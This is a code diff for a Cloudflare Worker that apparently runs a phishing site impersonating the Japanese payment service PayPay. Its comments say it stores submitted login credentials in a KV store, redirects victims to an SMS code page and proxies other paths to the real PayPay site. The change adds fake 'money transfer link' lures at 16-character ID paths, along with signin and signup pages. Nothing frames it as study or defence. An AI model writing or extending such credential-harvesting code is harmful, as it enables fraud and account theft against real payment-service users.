@@ -2,15 +2,17 @@
 // KV binding: CREDS
 // / → /admin リダイレクト
 // /admin で管理画面
-// 16文字IDパスは既存の docs/signin.html を配信
+// 16文字IDパスは docs/link.html（送金リンクページ）を配信
+// /signin.html でログイン画面
 // /api/login で credential を KV に保存して sms.html へリダイレクト
-// 未知のパスは PayPay にプロキシ
 
 const TARGET_ORIGIN = "https://www.paypay.ne.jp";
 const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
 const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
+const LINK_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/link.html";
 const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
 const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/sms.html";
+const SIGNUP_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signup.html";
 
 export default {
   async fetch(request, env) {
@@ -25,8 +27,16 @@ export default {
       return fetchStatic(ADMIN_SOURCE);
     }
 
+    if (url.pathname === "/link.html" || url.pathname === "/link") {
+      return fetchStatic(LINK_SOURCE);
+    }
+
     if (url.pathname === "/signin.html" || url.pathname === "/signin") {
       return fetchStatic(SIGNIN_SOURCE);
+    }
+
+    if (url.pathname === "/signup.html" || url.pathname === "/signup") {
+      return fetchStatic(SIGNUP_SOURCE);
     }
 
     if (url.pathname === "/sms.html" || url.pathname === "/sms") {
@@ -68,7 +78,7 @@ export default {
 
     const pathParts = url.pathname.split("/").filter(Boolean);
     if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
-      return fetchStatic(SIGNIN_SOURCE);
+      return fetchStatic(LINK_SOURCE);
     }
 
     return proxy(request, env, workerHost);
